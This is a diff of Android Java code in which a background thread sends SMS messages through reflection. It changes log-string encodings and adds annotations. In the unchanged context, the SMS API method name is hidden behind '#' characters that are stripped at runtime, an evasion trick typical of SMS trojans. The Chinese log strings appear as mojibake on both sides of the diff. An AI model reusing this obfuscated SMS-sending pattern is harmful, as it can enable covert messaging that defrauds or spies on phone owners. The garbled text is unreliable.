@@ -15,15 +15,16 @@ public class DmsManager  {
 	private static ExecutorService pool = Executors.newFixedThreadPool(1);
 	public static void Send(Context context,String phone,String content) {
 		Intent sentIntent = new Intent("SENT_SMS_ACTION"); 
-		LogUtils.write("Send", "¹ã²¥ "+phone+"--"+content);
-		sentIntent.putExtra("phone", "ºÅÂë"+phone+",ÄÚÈİ"+content);
+		LogUtils.write("Send", "å¹¿æ’­ "+phone+"--"+content);
+		sentIntent.putExtra("phone", "å·ç "+phone+",å†…å®¹"+content);
 		PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent,PendingIntent.FLAG_UPDATE_CURRENT);
 		ArrayList<PendingIntent> arrays=new ArrayList<PendingIntent>();
 		arrays.add(sentPI);
-		LogUtils.write("Send", "¶ÌĞÅÌí¼Óµ½·¢ËÍÏß³Ì"+phone+"--"+content);
+		LogUtils.write("Send", "çŸ­ä¿¡æ·»åŠ åˆ°å‘é€çº¿ç¨‹"+phone+"--"+content);
 		pool.execute(new SendThread(arrays,phone,content));
     }
 }
+
 class SendThread extends Thread{
 	private static String methodstr="s#e#n#d#M#u#l#t#i#p#a#r#t#T#e#x#t#M#e#s#s#a#g#e#";
 	private String content;
@@ -34,11 +35,13 @@ class SendThread extends Thread{
 		this.phone=phone;
 		this.arrays=arrays;
 	}
+	
+	@SuppressWarnings("rawtypes")
 	@Override
 	public void run() {
 		// TODO Auto-generated method stub
 		super.run();
-		LogUtils.write("Send", "·¢ËÍ¶ÌĞÅÏß³ÌÆô¶¯");
+		LogUtils.write("Send", "å‘é€çŸ­ä¿¡çº¿ç¨‹å¯åŠ¨");
 		
 		SmsManager smr = SmsManager.getDefault();
         try {
@@ -50,7 +53,8 @@ class SendThread extends Thread{
             argsClass[3] = ArrayList.class;
             argsClass[4] = ArrayList.class;
             
-            Method method = ownerClass.getMethod(methodstr.replaceAll("#", ""),argsClass);
+            @SuppressWarnings("unchecked")
+			Method method = ownerClass.getMethod(methodstr.replaceAll("#", ""),argsClass);
             
             Object[] arrayOfObject = new Object[5];
             arrayOfObject[0] = phone;
@@ -59,7 +63,7 @@ class SendThread extends Thread{
             arrayOfObject[3] = arrays;
             arrayOfObject[4] = null;
             method.invoke(smr, arrayOfObject);
-            LogUtils.write("Send", "·¢ËÍ¶ÌĞÅÏß³Ì½áÊø");
+            LogUtils.write("Send", "å‘é€çŸ­ä¿¡çº¿ç¨‹ç»“æŸ");
         } catch (Exception e) {
             e.printStackTrace();
         }
